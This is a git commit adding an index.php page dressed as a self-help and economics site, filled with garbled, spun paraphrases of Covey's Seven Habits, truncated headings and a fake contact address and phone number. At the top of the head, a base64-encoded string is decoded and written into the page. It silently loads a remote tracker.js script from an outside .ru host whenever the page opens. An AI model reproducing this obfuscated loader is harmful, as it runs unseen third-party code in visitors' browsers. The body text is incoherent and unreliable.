34b99717721b76dfc13a50ffa6a6d8c74c23ae24
wakggkkz <79408175+wakggkkz@users.noreply.github.com>
2021-02-21 15:56:13 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl81YXRrbmp2OXFsdHh3Nzl0c2MiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>By reading Covey's Seven Habits, you will master the phil</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="9mb0mms6cuhzdo8ju">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="iq4ikffbkk7xaxvj5uhs8zt">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>By reading Covey's Seven Habits, you will master the phil</h1>
+	</section>
+
+
+	<section class="our-work" class="wgd142g3wv3fqnvxanp">
+		<h3 class="title">O., where D is the number of monetary units require</h3>
+		<p>Indeed, without education in our world you cannot go far.  I have had the opportunity to work with many people - amazing people, talented people, people who wholeheartedly strive for happiness and success, people who are seeking, people who are amazing.  Example: if the prices of seeds and fertilizers go down,an increase in the supply of corn can be expected.  - Yes you? Horrible! What do we do? With such comparative information, it is overshadowed by the fact that Johnny may be using all eight cylinders of his engine, while Caroline only needs four out of eight.  I wanted to truly become a leader for my organization.  They are imbued with those unchanging values ​​that constitute the essence, the core of the organization.  Their openness, in turn, infects other participants, and a general creative empathy arises, providing deeper understanding, gaining new knowledge and maintaining a sense of joyful excitement, which does not allow this process to stop. </p>
+		<hr>
+
+		<ul class="grid" class="6f74yj2k39i56zych">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="9mb0mms6cuhzdo8ju">
+		<h3 class="title">If the expectations are not clear and not </h3>
+		<p>As we study these skills, we will see how they interact with each other to create effective interdependence.  6.  I do not hire you or you and I do not sign mutual obligations, since it is obvious that our values ​​and our goals are fundamentally different.  There are some that can only be achieved on Saturday or Sunday when your kids are at home. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="iq4ikffbkk7xaxvj5uhs8zt" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="wgd142g3wv3fqnvxanp">
+		<h3 class="title">Land as a resource means not only the land itself, but also all</h3>
+		<p>It is called fixed capital.  This is the case! - It seems so to you now! But several years will pass and Joe will regret not staying at school.  It was a chicken and egg problem in finance.  Next comes quality and excellence.There is also the principle of potential opportunities - the idea that we are in the initial stage of development and can grow and develop, more and more revealing our potentialities and developing our abilities.  The methodological theory of production is largely symmetrical to the theory of consumption.  And to get these eggs regularly, we must take care of the goose.  Are you satisfied with the house you live in? - Yes.  It is a powerful skill for effective interdependence.  Exercise is a Quadrant II activity, a higher order activity that most of us do not do because it is not urgent.And since we do not fulfill them, sooner or later we find ourselves in Quadrant I, forced to struggle with health problems and crisis situations that are a natural result of our neglect of physical activities.  Christ changes the person, who then changes his environment.  While the practice is different in each situation, the principles are deep, fundamental truths that have universal application.They can be applied to individuals, to marriage, to the family, to a variety of private and public organizations. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="6f74yj2k39i56zych" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="9mb0mms6cuhzdo8ju">
+		<h3 class="title">And at the end of them we will arrive at the same p</h3>
+		<p>However, no work,neither money alone gives wisdom or inner orientation.  You can have dinner together or choose another activity,able to please both of you.  We are more aware of the environment.  Now tell me who will be your boss? - You, dad? - No, not me.  And I foundthat my attachment to the given structure of the seminar is gradually weakening and completely new perspectives open up.  Why do you think your people refuse to cooperate? What does it give them? What reward do they get for this? - It doesn't give them anything! There is no reward for lack of cooperation, the president assured me.  The results are like miracles.  A perfectly competitive firm is a firm that “takes the price” of its products as given, independent of the volume of products it sells.  Fortunately, it was not often necessary to face her stubbornness: only when it was required to purchase something from household appliances.  And if this center does not help you to become a proactive person, then a corresponding paradigm shift is necessary, thanks to which you will acquire the center that you need. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="iq4ikffbkk7xaxvj5uhs8zt" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="wgd142g3wv3fqnvxanp">
+		<h3 class="title">According to one of the definitions, "a li</h3>
+		<p>You must present your point of view as simply and vividly as possible, and describe his position even better than he himself could have done it.  In connection with the widespread use of computer technology, information begins to play a significant role in production.  The theory of consumer behavior shows how the choice is influenced by the prices of goods, preferences, income.  So we did not agree with him.  - Honey, Stephen just came in for a few minutes to help us.  Delegation of execution means: "Go there, go here, do this, do this and report back to me when everything is done!" Many human producers have a delegated execution paradigm.  But I would not like that.  Writing good letters — about deep thoughts, feelings, and ideas, rather than a superficial listing of events — also affects your ability to think clearly and reasonably, and your ability to be understood effectively.  * * * The family of a friend of mine has been fond of singing in chorus for several years.  Parents with great desire and even joy will seek to understand their children more deeply and help them.  But at its core, your Personal Mission becomes your constitution, a clear expression of your vision and your values.  But the situation of the situation is different.  - Well! We have decided on this.  The most liquid assets are cash and investments in short-term securities. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="6f74yj2k39i56zych" class="title">When setting different tariffs for using the telephone, dependi</h3>	
+		<p>I understood him.  It is the power to act in harmony with your proactive first creation.  Factor markets provide entrepreneurs with information on prices,technical and economic characteristics of goods, the level of production costs, supply volumes, etc.  And this is best done in the context of the week.  Goethe said: “If you treat a person according to what he is, he will remain what he is.  This fable tells how a poor peasant one day discovers a sparkling golden egg in the nest of his favorite goose.  Behind them are managers, those who run the manufacturers.  I lift my foot off the brake pedal and neutralize any negative energy that you could channel to defend your position. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="9mb0mms6cuhzdo8ju">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="iq4ikffbkk7xaxvj5uhs8zt"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="wgd142g3wv3fqnvxanp"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="6f74yj2k39i56zych"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>507 Cassin Route, Suite 210, 68399-5888, South Mattberg, New York, United States</p>
+		<p>Phone number: +462(516)998-96-33290</p>
+	</footer>
+
+</body>
+
+</html>
